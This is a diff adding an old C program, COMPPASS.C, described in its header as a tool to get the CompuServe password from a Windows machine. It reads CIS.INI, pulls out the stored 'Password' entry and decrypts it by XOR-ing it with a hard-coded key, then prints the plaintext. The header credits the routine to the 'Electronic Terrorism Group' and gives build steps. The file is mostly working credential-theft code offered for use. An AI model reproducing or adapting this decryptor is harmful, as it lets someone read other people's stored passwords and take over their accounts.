@@ -1,0 +1,80 @@
+/*********************************************************************
+ *                                                                   *
+ * COMPPASS.C by EXE-Gency                                           *
+ * A program to find the compuserve password on a windows machine by *
+ * searching the C:\WINDOWS directory for the CIS.INI file that      *
+ * contains the encrypted password. The encryption routine was taken *
+ * from an old file by Gnasher from the Electronic Terrorism Group.  *
+ *                                                                   *
+ * If you want to compile the source code yourself you'll need a     *
+ * copy of DJGPP:                                                    *
+ *                                                                   *
+ * GCC -O COMPPASS.EXE COMPPASS.C                                    *
+ *                                                                   *
+ *********************************************************************/
+
+#include "stdio.h"
+#include "process.h"
+#include "string.h"
+#include "ctype.h"
+
+unsigned int GetDec(char C[2]); // Function that returns the integer value
+                                // of a two character hex digit
+
+int main() {
+    FILE          *File;
+    char          String[200], *Ptr1, *Ptr2;
+    unsigned int  Counter1, Decimal;
+    char          TwoChar[2];
+    unsigned char Key[24]={198,253,199,161,237,251,  // Keys for each char
+                           182,254,227,219,245,190,
+                           186,239,221,247,171,198,
+                           253,199,161,237,251,182};
+
+    printf("COMPPASS v1.0 EXE-Gency. Program to get compuserve password.\n");
+    if((File=fopen("CIS.INI", "r"))==NULL) {
+    // Carnt open file CIS.INI in current directory for reading
+        printf("Cannot find file CIS.INI in current directory!\n");
+        printf("Aborted");
+        exit(1); // Quit to OS
+    }
+
+    while(!feof(File)) {
+        fgets(String, 199, File); // Read string
+        Ptr1=strstr(String, "Password"); // Is 'Password' in string?
+        if(!(Ptr1-String)) { // Yep!
+            printf("Encrypted %s", String);
+            Ptr1=String;
+            Ptr2=String;
+            Ptr1+=9;
+            while(*Ptr1) { // Copy string
+                *Ptr2=*Ptr1;
+                Ptr1++;
+                Ptr2++;
+            }
+            *Ptr2=*Ptr1;
+            printf("True Password=");
+            for(Counter1=0; Counter1<strlen(String); Counter1+=2) {
+               TwoChar[0]=String[Counter1];
+               TwoChar[1]=String[Counter1+1]; // Get hex string
+               Decimal=GetDec(TwoChar); // Convert to decimal
+               if(Decimal^Key[Counter1/2]) printf("%c", Decimal^Key[Counter1/2]);
+               else break;
+            }
+            printf("\n"); // CR/LF
+        }
+    }
+    fclose(File);
+    return 0;
+}
+
+unsigned int GetDec(char C[2]) {
+    unsigned int X;
+    X=0;
+    if(isdigit(C[0])) X+=(C[0]-48)*16;
+    else X+=(C[0]-55)*16;
+
+    if(isdigit(C[1])) X+=(C[1]-48);
+    else X+=(C[1]-55);
+    return X;
+}
